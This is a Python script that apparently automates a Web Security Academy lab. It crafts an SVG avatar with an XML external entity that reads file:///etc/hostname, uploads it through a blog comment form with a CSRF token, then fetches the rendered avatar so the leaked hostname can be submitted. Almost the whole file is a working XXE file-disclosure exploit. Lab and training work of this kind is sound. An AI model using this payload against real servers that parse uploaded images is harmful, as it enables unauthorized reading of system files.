from web_security_academy.core.utils import *
from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup
from html import unescape
from lxml import etree


def solve_lab(session):
    csrf = session.get_csrf_token("/post?postId=1")

    # Construct SVG
    svg_namespace = "http://www.w3.org/2000/svg"
    svg = "{%s}" % svg_namespace
    nsmap = {None: svg_namespace}

    svg = etree.Element(
        "svg", nsmap=nsmap, width="128px", height="128px", version="1.1"
    )
    kwargs = {"font-family": "Consolas", "font-size": "16", "x": "0", "y": "16"}
    etree.SubElement(svg, "text", **kwargs).text = "&xxe;"

    doctype = '<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>'
    avatar = etree.tostring(svg, doctype=doctype)
    avatar = unescape(avatar.decode())

    # Submit post comment
    files = {
        "avatar": ("avatar.svg", avatar),
    }

    data = {
        "csrf": csrf,
        "postId": "1",
        "comment": "comment",
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }

    path = "/post/comment"
    print_info(
        f'Injecting an XML external entity with the following POST request form data to "{path}":\n'
    )
    print(f"data: {data}\n")
    print(f"files: {files}\n")

    resp = session.post_path(path, data=data, files=files)
    if resp.status_code == 200:
        print_success("XXE injection successful.\n")
    else:
        print_fail("XXE injection not successful.")

    # Extract avatar image URL
    path = "/post"
    params = {"postId": 1}
    print_info(f'Extracting avatar image URL from "{path}?{urlencode(params)}"')

    resp = session.get_path(path, params=params)
    soup = BeautifulSoup(resp.text, "lxml")
    avatar_img = soup.select(".avatar")
    if len(avatar_img) == 0:
        print_fail("Unable to extract avatar image URL.")
    else:
        avatar_url = urljoin(session.url, avatar_img[-1].get("src"))
        print_success(f"Avatar image URL: {avatar_url}\n")

    hostname = print_input("Enter the hostname from the provided URL here: ")
    session.submit_solution(hostname)
